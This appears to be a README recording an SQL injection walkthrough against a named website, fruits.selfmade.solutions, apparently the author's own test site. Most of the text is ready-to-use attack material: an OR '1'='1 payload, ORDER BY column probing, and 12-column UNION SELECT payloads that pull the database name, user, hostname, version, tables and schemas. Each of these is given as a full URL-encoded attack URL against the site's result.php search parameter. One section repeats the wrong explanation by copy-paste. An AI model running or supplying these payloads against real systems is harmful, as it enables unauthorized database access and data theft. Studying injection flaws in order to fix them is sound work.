# Website Link : https://fruits.selfmade.solutions

This website is Vulnerabile in sql injection. Here we see how sql injection happen in real world using this website.

# SQL Injection Vulnerability Experiment

## Overview

This section documents the SQL injection vulnerabilities identified in the website [https://fruits.selfmade.solutions/]. The vulnerabilities allow unauthorized access to the database, potentially leading to data exposure and manipulation.

## Testing for SQL Injection

To determine if a website is vulnerable to SQL injection, you can use various payloads and observe the system's responses. Here are some commands and payloads that were used to test the website.

### Basic SQL Injection Test

To perform a basic SQL injection test, input the following payload into the search functionality of the website:

' OR '1'='1

**Expected Outcome:** The query should return all records, indicating that the SQL injection is successful.

### Advanced SQL Injection Tests

#### Finding the Number of Columns

You may need to find the number of columns in the original query. This can be done with an injection like:

- `' ORDER BY 1;--`
- `' ORDER BY 2;--`
- `' ORDER BY 3;--`

Continue increasing the number until you get an error, which will indicate the number of columns.

Inject the Union-Based Payload:
Once you know the number of columns, use the UNION injection.

Knowing that the search table has 12 columns, you need to adjust your UNION SELECT statement to match this structure. Here's how you can do it:

Crafting the Injection Payload for a 12-Column Table
Match the Number of Columns:
Ensure the UNION SELECT has the same number of columns as the original query.

Use Null Values for Unneeded Columns:
If you're only interested in extracting the database name, use null for the other columns.

### Extracting the database name

`' UNION SELECT database(), null, null, null, null, null, null, null, null, null, null, null;--`

Here we use URL encode because this website uses GET method in form so the given inputs are passes through the URL so we use URL encoding to avoid errors.Which can be seen clearly in result page URL after searching like `apple` etc...

URL Encoded Payload
To use this in a URL, you need to URL-encode the payload:

plaintext

`%27%20UNION%20SELECT%20database%28%29%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%3B--`

Full URL

https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20database%28%29%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%2C%20null%3B--%20

Explanation

' UNION SELECT database(), null, null, null, null, null, null, null, null, null, null, null;--:
This payload injects a union query that matches the 12-column structure of the original query and extracts the current database name.

URL-encoded version:

This converts the payload into a format suitable for use in a URL.

we can't use Error-Based Injection in this website because the error stop the flow of execution in the server.

### Retrieving User Name

To find the username of the current MySQL user through SQL injection, you can use the user() function in your SQL injection payload. This function returns the current MySQL user and host.
To retrieve the database user name, use the following payload:

`' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL;-- `

Full URL

plaintext

https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20user%28%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%3B--%20

### Retrieving Server Name

To find the username of the current MySQL user through SQL injection, you can use the user() function in your SQL injection payload. This function returns the current MySQL user and host.
To retrieve the database user name, use the following payload:

`' UNION SELECT @@hostname, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL;-- `

Full URL

https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20%40%40hostname%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%3B--%20

### Retriving Sql Version 

use the following payload:

`' UNION SELECT version(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL;-- `

Full URL

https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20version%28%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%3B--%20

### Listing All Tables in the Database

To list all tables in the current database, use:

`' UNION SELECT GROUP_CONCAT(table_name), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database();-- `

Full URL

https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20GROUP_CONCAT%28table_name%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20%3D%20database%28%29%3B--%20

### Listing All Databases

To list all databases, use:

`' UNION SELECT GROUP_CONCAT(schema_name), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.schemata;-- `

Full URL

https://fruits.selfmade.solutions/result.php?search=%27%20UNION%20SELECT%20GROUP_CONCAT%28schema_name%29%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20information_schema.schemata%3B--%20

### To find additional informations

use:`' OR ``id``='3' -- `
